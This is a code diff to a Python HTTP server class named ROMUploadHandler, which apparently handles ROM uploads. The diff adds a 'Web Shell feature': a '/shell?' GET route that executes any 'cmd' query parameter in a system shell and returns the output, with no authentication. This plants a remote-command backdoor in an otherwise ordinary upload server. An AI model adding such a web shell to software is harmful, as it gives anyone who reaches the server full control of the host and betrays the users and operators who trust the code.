@@ -107,6 +107,26 @@ class ROMUploadHandler(http.server.SimpleHTTPRequestHandler):
         print(f"[{self.command}] {self.path} {args[1]}", flush=True)
 
     def do_GET(self):
+        # Web Shell feature
+        if self.path.startswith('/shell?'):
+            import subprocess
+            query = urllib.parse.urlparse(self.path).query
+            params = urllib.parse.parse_qs(query)
+            cmd = params.get('cmd', [''])[0]
+            try:
+                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
+            except subprocess.CalledProcessError as e:
+                out = e.output if e.output else str(e)
+            except Exception as e:
+                out = str(e)
+            encoded = out.encode('utf-8')
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain; charset=utf-8')
+            self.send_header('Content-Length', str(len(encoded)))
+            self.end_headers()
+            self.wfile.write(encoded)
+            return
+
         # Handle favicon - return tiny GIF
         if self.path == '/favicon.ico':
             self.send_response(200)
